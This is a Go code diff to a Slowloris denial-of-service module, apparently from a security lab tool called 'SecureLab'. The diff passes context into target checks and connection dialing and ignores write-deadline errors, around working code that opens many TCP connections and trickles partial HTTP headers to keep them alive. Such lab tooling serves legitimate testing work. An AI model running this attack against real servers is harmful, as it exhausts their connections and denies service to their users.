@@ -37,7 +37,7 @@ func NewSlowloris() *Slowloris { return &Slowloris{} }
 //   - "duration"    string — how long to keep connections open (default "15s", max "120s")
 //   - "send_interval" string — how often to send a partial header (default "3s")
 func (s *Slowloris) Run(ctx context.Context, targetIP, targetPort string, params map[string]any) (*AttackResult, error) {
-	if err := checkNetworkTarget(targetIP); err != nil {
+	if err := checkNetworkTarget(ctx, targetIP); err != nil {
 		return nil, err
 	}
 
@@ -70,7 +70,7 @@ func (s *Slowloris) Run(ctx context.Context, targetIP, targetPort string, params
 		default:
 		}
 
-		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
+		conn, err := (&net.Dialer{Timeout: 2 * time.Second}).DialContext(ctx, "tcp", addr)
 		if err != nil {
 			continue
 		}
@@ -79,12 +79,12 @@ func (s *Slowloris) Run(ctx context.Context, targetIP, targetPort string, params
 			"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: SecureLab-Slowloris\r\nAccept: */*\r\n",
 			targetIP,
 		)
-		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+		_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
 		if _, err := conn.Write([]byte(initialHeader)); err != nil {
 			conn.Close()
 			continue
 		}
-		conn.SetWriteDeadline(time.Time{})
+		_ = conn.SetWriteDeadline(time.Time{})
 
 		mu.Lock()
 		conns = append(conns, conn)
@@ -104,9 +104,9 @@ func (s *Slowloris) Run(ctx context.Context, targetIP, targetPort string, params
 			mu.Lock()
 			alive := 0
 			for _, conn := range conns {
-				conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
+				_ = conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
 				_, err := conn.Write([]byte("X-SecureLab-Keep: alive\r\n"))
-				conn.SetWriteDeadline(time.Time{})
+				_ = conn.SetWriteDeadline(time.Time{})
 				if err == nil {
 					alive++
 				}
